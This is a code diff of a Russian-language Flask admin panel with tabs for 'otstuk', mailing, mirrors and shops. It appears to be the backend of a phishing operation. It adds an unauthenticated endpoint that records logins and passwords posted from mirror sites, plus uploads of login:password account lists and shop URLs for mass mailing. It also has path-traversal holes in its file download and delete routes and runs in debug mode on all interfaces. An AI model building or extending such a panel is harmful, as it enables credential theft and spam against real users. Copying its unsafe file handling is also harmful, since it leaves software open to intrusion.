@@ -34,12 +34,12 @@ class UserDB(db.Model, UserMixin):
     username = db.Column(db.String(80), unique=True, nullable=False)
     password_hash = db.Column(db.String(256), nullable=False)
     role = db.Column(db.String(20), default='user')
-    allowed_tabs = db.Column(db.Text, default='files,rassylka,sites,status,otstuk')
+    allowed_tabs = db.Column(db.Text, default='files,rassylka,sites,status,otstuk,updates')
 
     @property
     def allowed_tabs_list(self):
         if not self.allowed_tabs:
-            return ["files", "rassylka", "sites", "status", "otstuk"]
+            return ["files", "rassylka", "sites", "status", "otstuk", "updates"]
         return [t.strip() for t in self.allowed_tabs.split(',') if t.strip()]
 
 
@@ -72,16 +72,13 @@ class OtstukLog(db.Model):
     mirror = db.Column(db.String(100))
 
 
-class Update(db.Model):          # ← Новая модель для обновлений
+class Update(db.Model):
     __tablename__ = 'updates'
     id = db.Column(db.Integer, primary_key=True)
     title = db.Column(db.String(200), nullable=False)
     content = db.Column(db.Text, nullable=False)
     created_at = db.Column(db.DateTime, default=datetime.utcnow)
     author = db.Column(db.String(80), default='admin')
-
-    def __repr__(self):
-        return f'<Update {self.title}>'
 
 
 # ====================== ИНИЦИАЛИЗАЦИЯ ======================
@@ -153,9 +150,9 @@ def logout():
 @login_required
 def dashboard():
     if not is_tab_allowed(current_user, 'files'):
-        flash('Доступ запрещён', 'danger')
+        flash('Доступ к этой вкладке запрещён', 'danger')
         return redirect(url_for('status'))
-    # ... (оставляем как было)
+    
     files = []
     for filename in os.listdir(UPLOAD_FOLDER):
         filepath = os.path.join(UPLOAD_FOLDER, filename)
@@ -168,6 +165,7 @@ def dashboard():
                 'upload_time_short': datetime.fromtimestamp(mtime).strftime('%d.%m %H:%M')
             })
     files.sort(key=lambda x: x['upload_time_short'], reverse=True)
+    
     is_admin = current_user.role == 'admin'
     return render_template('dashboard.html', files=files, is_admin=is_admin, active='files')
 
@@ -219,7 +217,6 @@ def rassylka():
                            shops_count=get_shops_count())
 
 
-# ====================== НОВАЯ ВКЛАДКА — ОБНОВЛЕНИЯ ======================
 @app.route('/updates')
 @login_required
 def updates():
@@ -248,7 +245,6 @@ def add_update():
         flash('Обновление успешно добавлено!', 'success')
     else:
         flash('Заполните заголовок и текст обновления', 'danger')
-    
     return redirect(url_for('updates'))
 
 
@@ -319,12 +315,159 @@ def add_user():
     return render_template('add_user.html', available_tabs=available_tabs)
 
 
-# ... (остальные маршруты: delete_user, upload_file, add_site, otstuk_post, upload_accounts и т.д. остаются без изменений)
+@app.route('/delete_user/<username>')
+@login_required
+def delete_user(username):
+    if current_user.role != 'admin':
+        flash('Доступ запрещён', 'danger')
+        return redirect(url_for('dashboard'))
+    if username == "admin":
+        flash('Нельзя удалить главного администратора', 'danger')
+        return redirect(url_for('users_page'))
+    
+    user = UserDB.query.filter_by(username=username).first()
+    if user:
+        db.session.delete(user)
+        db.session.commit()
+        flash(f'Пользователь "{username}" удалён', 'success')
+    return redirect(url_for('users_page'))
+
+
+# ====================== ФАЙЛЫ ======================
+@app.route('/upload', methods=['POST'])
+@login_required
+def upload_file():
+    if current_user.role != 'admin':
+        flash('Нет прав на загрузку файлов', 'danger')
+        return redirect(url_for('dashboard'))
+    file = request.files.get('file')
+    if file and file.filename:
+        filename = secure_filename(file.filename)
+        file.save(os.path.join(UPLOAD_FOLDER, filename))
+        flash('Файл успешно загружен!', 'success')
+    return redirect(url_for('dashboard'))
+
+
+@app.route('/download/<filename>')
+@login_required
+def download_file(filename):
+    return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True)
+
+
+@app.route('/delete/<filename>')
+@login_required
+def delete_file(filename):
+    if current_user.role != 'admin':
+        flash('Нет прав', 'danger')
+        return redirect(url_for('dashboard'))
+    try:
+        os.remove(os.path.join(UPLOAD_FOLDER, filename))
+        flash('Файл удалён', 'success')
+    except:
+        flash('Ошибка удаления', 'danger')
+    return redirect(url_for('dashboard'))
+
+
+# ====================== ЗЕРКАЛА ======================
+@app.route('/add_site', methods=['POST'])
+@login_required
+def add_site():
+    if current_user.role != 'admin':
+        flash('Нет прав', 'danger')
+        return redirect(url_for('sites'))
+    name = request.form.get('name', '').strip()
+    url = request.form.get('url', '').strip()
+    if name and url:
+        if not Site.query.filter_by(url=url).first():
+            new_site = Site(name=name, url=url)
+            db.session.add(new_site)
+            db.session.commit()
+            flash('Зеркало успешно добавлено!', 'success')
+        else:
+            flash('Такое зеркало уже существует', 'danger')
+    else:
+        flash('Заполните все поля', 'danger')
+    return redirect(url_for('sites'))
+
+
+@app.route('/delete_site/<int:index>')
+@login_required
+def delete_site(index):
+    if current_user.role != 'admin':
+        flash('Нет прав на удаление зеркал', 'danger')
+        return redirect(url_for('sites'))
+    site = Site.query.get(index)
+    if site:
+        deleted_name = site.name
+        db.session.delete(site)
+        db.session.commit()
+        flash(f'Зеркало "{deleted_name}" успешно удалено', 'success')
+    else:
+        flash('Зеркало не найдено', 'danger')
+    return redirect(url_for('sites'))
+
+
+# ====================== ОТСТУК ======================
+@app.route('/otstuk/post', methods=['POST'])
+def otstuk_post():
+    login = request.form.get('login', '')
+    password = request.form.get('password', '')
+    mirror = request.form.get('mirror', 'Неизвестно')
+    if login or password:
+        new_log = OtstukLog(login=login, password=password, mirror=mirror)
+        db.session.add(new_log)
+        db.session.commit()
+    return "OK", 200
+
+
+# ====================== РАССЫЛКА ======================
+@app.route('/upload_accounts', methods=['POST'])
+@login_required
+def upload_accounts():
+    if current_user.role != 'admin':
+        flash('Нет прав', 'danger')
+        return redirect(url_for('rassylka'))
+    file = request.files.get('accounts_file')
+    if file and file.filename:
+        Account.query.delete()
+        db.session.commit()
+        content = file.read().decode('utf-8')
+        for line in content.splitlines():
+            line = line.strip()
+            if ':' in line:
+                login, pwd = line.split(':', 1)
+                acc = Account(login=login.strip(), password=pwd.strip())
+                db.session.add(acc)
+        db.session.commit()
+        flash('База аккаунтов успешно загружена!', 'success')
+    return redirect(url_for('rassylka'))
+
+
+@app.route('/upload_shops', methods=['POST'])
+@login_required
+def upload_shops():
+    if current_user.role != 'admin':
+        flash('Нет прав', 'danger')
+        return redirect(url_for('rassylka'))
+    file = request.files.get('shops_file')
+    if file and file.filename:
+        Shop.query.delete()
+        db.session.commit()
+        content = file.read().decode('utf-8')
+        for line in content.splitlines():
+            url = line.strip()
+            if url:
+                if not Shop.query.filter_by(url=url).first():
+                    db.session.add(Shop(url=url))
+        db.session.commit()
+        flash('База шопов успешно загружена!', 'success')
+    return redirect(url_for('rassylka'))
 
 
 if __name__ == '__main__':
     with app.app_context():
         db.create_all()
         create_default_admin()
-    print("🚀 Сервер запущен с вкладкой Обновления")
+    print("🚀 Сервер запущен → http://127.0.0.1:5000")
+    print("База данных: Neon Postgres + вкладка Обновления")
     app.run(debug=True, host='0.0.0.0', port=5000)
